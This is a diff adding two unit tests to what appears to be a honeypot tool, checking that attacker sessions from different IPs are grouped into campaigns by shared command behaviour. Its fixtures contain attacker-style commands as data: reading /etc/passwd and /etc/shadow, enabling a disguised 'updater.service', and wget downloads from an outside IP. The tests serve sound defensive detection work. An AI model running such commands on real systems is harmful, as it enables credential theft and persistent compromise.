@@ -404,6 +404,28 @@ class Store(unittest.TestCase):
         self.assertEqual(sample["sources"], 2)
         self.assertEqual(sample["confidence"], "high")
 
+    def test_campaigns_correlate_distinct_sources_by_behavior_without_shared_hash(self):
+        commands_a = ["ps aux", "cat /etc/passwd", "cat /etc/shadow", "systemctl enable updater.service"]
+        commands_b = ["systemctl enable updater.service", "cat /etc/shadow", "ps aux", "cat /etc/passwd"]
+        self.h.add_session(self.session(session="behavior-a", ip="198.51.100.21", hassh="client-a",
+                                        commands=commands_a, files=[]))
+        self.h.add_session(self.session(session="behavior-b", ip="198.51.100.22", hassh="client-b",
+                                        commands=commands_b, files=[]))
+        result = self.h.campaigns(24)
+        pattern = next(x for x in result["campaigns"] if x["kind"] == "Behavior pattern")
+        self.assertEqual(pattern["sources"], 2)
+        self.assertEqual(pattern["source_ips"], ["198.51.100.21", "198.51.100.22"])
+        self.assertEqual(pattern["confidence"], "moderate")
+        self.assertEqual(pattern["samples"], 0)
+
+    def test_campaigns_do_not_correlate_short_or_generic_behavior(self):
+        self.h.add_session(self.session(session="generic-a", ip="198.51.100.31",
+                                        commands=["uname -a", "wget http://1.2.3.4/a"], files=[]))
+        self.h.add_session(self.session(session="generic-b", ip="198.51.100.32",
+                                        commands=["uname -a", "wget http://1.2.3.4/b"], files=[]))
+        result = self.h.campaigns(24)
+        self.assertFalse(any(x["kind"] == "Behavior pattern" for x in result["campaigns"]))
+
     def test_session_includes_ordered_attack_timeline(self):
         self.h.add_session(self.session(
             session="timeline1",
